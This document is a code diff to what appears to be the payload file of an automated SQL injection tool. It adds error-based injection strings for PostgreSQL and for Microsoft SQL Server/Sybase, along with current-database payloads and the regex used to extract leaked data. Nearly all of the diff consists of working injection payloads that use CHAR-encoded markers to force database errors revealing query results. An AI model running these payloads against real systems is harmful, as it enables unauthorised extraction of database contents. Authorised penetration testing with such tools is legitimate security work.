@@ -49,7 +49,7 @@ REGEX_GEOMETRIC_BASED = (
 )
 REGEX_GTID_BASED = r"(?isx)(?:Malformed.*?GTID.*?set.*?specification.*?\'Injected~(?:\()?(?P<xpath_data>.*?))\~END"
 REGEX_JSON_KEYS = r"(?isx)(?:Injected~(?:\()?(?P<xpath_data>.*?))\~END"
-REGEX_POSTGRES = r"(?isx)(?:r0oth3x49~(?P<xpath_data>.*?)\~END)"
+REGEX_GENERIC = r"(?isx)(?:r0oth3x49~(?P<xpath_data>.*?)\~END)"
 
 PAYLOADS_BANNER = [
     "VERSION()",
@@ -75,6 +75,8 @@ PAYLOADS_CURRENT_DATABASE = [
     "DATABASE/**_**/()",
     "DATABASE/*!50000()*/",
     "CURRENT_SCHEMA()",
+    "DB_NAME()",
+    "@@DB_NAME"
 ]
 
 PAYLOADS_HOSTNAME = [
@@ -253,10 +255,24 @@ PAYLOADS = [
         "back_end": "PostgreSQL",
         "version": ">8.1",
         "order": 16,
-        "regex": REGEX_POSTGRES,
-        "title": "PostgreSQL AND error-based - WHERE or HAVING clause",
+        "regex": REGEX_GENERIC,
+        "title": "PostgreSQL AND/OR error-based - WHERE or HAVING clause",
         "payloads": [
             "AND 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||1337::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
+            "OR 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||1337::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
+        ],
+    },
+    {
+        "back_end": "Microsoft SQL Server",
+        "version": "",
+        "order": 17,
+        "regex": REGEX_GENERIC,
+        "title": "Microsoft SQL Server/Sybase AND/OR error-based - WHERE or HAVING clause (IN)",
+        "payloads": [
+            "AND 3082 IN (SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (1337))%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))",
+            "OR 3082 IN (SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (1337))%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))",
+            "AND 3082 IN (SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (CHAR(49)%2BCHAR(51)%2BCHAR(51)%2BCHAR(55)))%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))",
+            "OR 3082 IN (SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (CHAR(49)%2BCHAR(51)%2BCHAR(51)%2BCHAR(55)) )%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))"
         ],
     },
 ]
